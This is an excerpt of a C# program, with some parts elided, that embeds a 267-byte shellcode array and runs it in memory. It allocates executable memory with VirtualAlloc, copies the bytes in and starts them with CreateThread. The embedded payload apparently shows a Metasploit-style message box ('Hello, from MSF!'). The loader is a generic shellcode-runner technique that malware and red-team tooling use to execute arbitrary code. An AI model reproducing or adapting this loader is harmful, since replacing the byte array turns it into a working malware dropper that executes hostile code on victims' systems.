...
namespace CreateThreadCSharp
{
    ...
    class Program
    {
        ...
        {
            byte[] buf = new byte[267] {0xd9,0xeb,0x9b,0xd9,0x74,0x24,
...
0x5f,0xff,0xff,0xff,0x68,0x61,0x72,0x65,0x58,0x68,0x4d,0x61,
0x6c,0x77,0x31,0xdb,0x88,0x5c,0x24,0x07,0x89,0xe3,0x68,0x58,
0x20,0x20,0x20,0x68,0x4d,0x53,0x46,0x21,0x68,0x72,0x6f,0x6d,
0x20,0x68,0x6f,0x2c,0x20,0x66,0x68,0x48,0x65,0x6c,0x6c,0x31,
0xc9,0x88,0x4c,0x24,0x10,0x89,0xe1,0x31,0xd2,0x52,0x53,0x51,
0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,0x55,0x08};

            IntPtr functionAllocatedAddress = VirtualAlloc(IntPtr.Zero, (UIntPtr)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            System.Runtime.InteropServices.Marshal.Copy(buf, 0, functionAllocatedAddress, buf.Length);
            IntPtr ThreadID = IntPtr.Zero;
            IntPtr ThreadHandle = CreateThread(IntPtr.Zero, UIntPtr.Zero, functionAllocatedAddress, IntPtr.Zero, 0, ref ThreadID);
